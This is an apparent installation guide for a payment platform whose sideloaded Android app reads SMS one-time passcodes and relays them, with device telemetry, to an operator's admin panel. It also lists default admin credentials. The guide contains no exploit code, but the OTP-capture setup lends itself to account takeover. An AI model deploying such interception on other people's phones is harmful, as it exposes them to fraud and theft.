# Installation Guide - GlobalPay Platform

Complete step-by-step installation guide for the GlobalPay payment platform with OTP monitoring.

---

## 📋 Prerequisites

- **Python 3.8+** installed
- **Node.js 18+** and npm installed
- **Android Studio** (for mobile app development)
- **Git** installed
- **Android device** with API 26+ (Android 8.0+)

---

## 🔧 Backend Setup (Flask)

### Step 1: Clone Repository

```bash
git clone https://github.com/p1ng1ng/globalpay-shareable.git
cd globalpay-shareable
```

### Step 2: Install Python Dependencies

```bash
pip install -r requirements.txt
```

**Or install manually:**

```bash
pip install Flask==3.0.0 flask-cors==4.0.0 python-dotenv==1.0.0 SQLAlchemy==2.0.23 Flask-SQLAlchemy==3.1.1 Werkzeug==3.0.1 bcrypt==4.1.2 PyJWT==2.8.0 requests==2.31.0
```

### Step 3: Configure Environment

```bash
cd website
cp .env.example .env
```

Edit `.env` if needed (optional for basic setup)

### Step 4: Initialize Database

The database will be automatically created on first run at:
```
website/instance/Wpay.sqlite3
```

### Step 5: Start Flask Server

```bash
cd website
python flask_app.py
```

**Server will run on:**
- Local: `http://127.0.0.1:5000`
- Network: `http://YOUR_LOCAL_IP:5000` (e.g., `http://192.168.1.2:5000`)

**Default admin credentials:**
- Email: `admin@wpay.com`
- Password: `admin123`

---

## 🌐 Frontend Setup (Next.js)

### Step 1: Install Node Dependencies

```bash
cd website
npm install
```

### Step 2: Configure Environment (Optional)

```bash
cp .env.example .env.local
```

Edit `.env.local`:
```env
NEXT_PUBLIC_API_URL=http://localhost:5000
```

### Step 3: Start Development Server

```bash
npm run dev
```

**Dashboard will run on:** `http://localhost:3000`

### Step 4: Access Admin Panel

1. Open browser: `http://localhost:3000`
2. Navigate to: `http://localhost:3000/admin/dashboard`
3. Login with admin credentials
4. Generate activation codes at: `http://localhost:3000/admin/activation-codes`

---

## 📱 Mobile App Setup (Android)

### Step 1: Open in Android Studio

1. Open Android Studio
2. Select "Open an existing project"
3. Navigate to `globalpay-shareable/auto-otp`
4. Click "OK"

### Step 2: Configure Backend URL

Create/edit `auto-otp/local.properties`:

```properties
MONITORING_BASE_URL=http://192.168.1.2:5000
```

**Replace `192.168.1.2` with your computer's local IP address**

To find your IP:
- **Windows**: `ipconfig` → Look for "IPv4 Address"
- **Mac/Linux**: `ifconfig` or `ip addr`

### Step 3: Build APK

1. In Android Studio: **Build → Build Bundle(s) / APK(s) → Build APK(s)**
2. Wait for build to complete
3. APK will be at: `auto-otp/app/build/outputs/apk/debug/app-debug.apk`

### Step 4: Install on Device

**Option A: USB Connection**
1. Enable USB debugging on device
2. Connect device via USB
3. In Android Studio: **Run → Run 'app'**

**Option B: Direct APK Install**
1. Copy `app-debug.apk` to device
2. Open file and install
3. Allow "Install from unknown sources" if prompted

### Step 5: Configure Device Permissions

On first launch, grant these permissions:
- ✅ SMS permissions (to read OTP messages)
- ✅ Notification access
- ✅ Battery optimization disabled (for background operation)

---

## 🚀 Complete Usage Flow

### 1. Start Backend Services

**Terminal 1 - Flask Backend:**
```bash
cd globalpay-shareable/website
python flask_app.py
```

**Terminal 2 - Next.js Frontend:**
```bash
cd globalpay-shareable/website
npm run dev
```

### 2. Generate Activation Code

1. Open: `http://localhost:3000/admin/activation-codes`
2. Login with admin credentials
3. Click "Generate Code"
4. Copy the 8-character code (e.g., `AB12CD34`)

### 3. Activate Mobile App

1. Install and open mobile app on device
2. Enter the activation code
3. Click "Verify Code"
4. Enter phone number when prompted
5. Click "Continue"

### 4. Monitor Device

1. Go to: `http://localhost:3000/admin/otp-devices`
2. View device status, phone number, and telemetry
3. Monitor OTP messages in real-time

---

## 🔍 Troubleshooting

### Backend Issues

**Issue:** `ModuleNotFoundError: No module named 'flask'`
**Solution:**
```bash
pip install -r requirements.txt
```

**Issue:** Database errors
**Solution:**
```bash
cd website
rm instance/Wpay.sqlite3  # Remove old database
python flask_app.py        # Will recreate database
```

### Frontend Issues

**Issue:** `Error: Cannot find module`
**Solution:**
```bash
cd website
rm -rf node_modules package-lock.json
npm install
```

**Issue:** Port 3000 already in use
**Solution:**
```bash
npm run dev -- -p 3001  # Use different port
```

### Mobile App Issues

**Issue:** "Network error" when verifying code
**Solution:**
1. Check Flask server is running
2. Verify `MONITORING_BASE_URL` in `local.properties`
3. Ensure device and computer are on same WiFi network
4. Test URL in browser: `http://YOUR_IP:5000`

**Issue:** App stops in background
**Solution:**
1. Go to device Settings → Apps → Auto OTP
2. Battery → "Don't optimize"
3. Background data → Allow
4. Auto-start → Enable

**Issue:** SMS not being captured
**Solution:**
1. Grant SMS permissions in app
2. Check app has notification access
3. Restart the app

---

## 📊 Verify Installation

### 1. Check Backend
```bash
curl http://localhost:5000/api/health
```
Should return JSON response

### 2. Check Frontend
Open: `http://localhost:3000`
Should see login page

### 3. Check Database
```bash
cd website/instance
ls -la Wpay.sqlite3
```
Database file should exist

### 4. Check Mobile App
- App shows "Device Activation" screen
- Can enter activation code
- Network connectivity indicator appears

---

## 🔐 Security Notes

1. **Change default admin password** in production
2. **Use HTTPS** for production deployment
3. **Keep `.env` files secure** (never commit to git)
4. **Rotate activation codes** regularly
5. **Enable firewall** on server

---

## 📞 Common Commands

### Start Everything
```bash
# Terminal 1: Backend
cd website && python flask_app.py

# Terminal 2: Frontend  
cd website && npm run dev
```

### Stop Services
- Press `Ctrl+C` in each terminal

### Rebuild Mobile App
```bash
cd auto-otp
./gradlew clean
./gradlew assembleDebug
```

### View Logs
```bash
# Backend logs: In terminal running flask_app.py
# Frontend logs: In terminal running npm run dev
# Mobile logs: Android Studio → Logcat
```

---

## ✅ Installation Complete!

You should now have:
- ✅ Flask backend running on port 5000
- ✅ Next.js frontend running on port 3000
- ✅ Mobile app installed on device
- ✅ Device activated with unique code
- ✅ Real-time OTP monitoring active

**Next Steps:**
1. Test OTP capture by sending SMS to device
2. View captured OTPs in admin panel
3. Monitor device telemetry
4. Explore merchant and payment features

---

## 📚 Additional Resources

- **Admin Panel**: `http://localhost:3000/admin/dashboard`
- **API Docs**: Check `website/backend/routes.py`
- **Database**: `website/instance/Wpay.sqlite3`
- **Mobile Logs**: Android Studio Logcat

For issues, check the troubleshooting section or contact support.
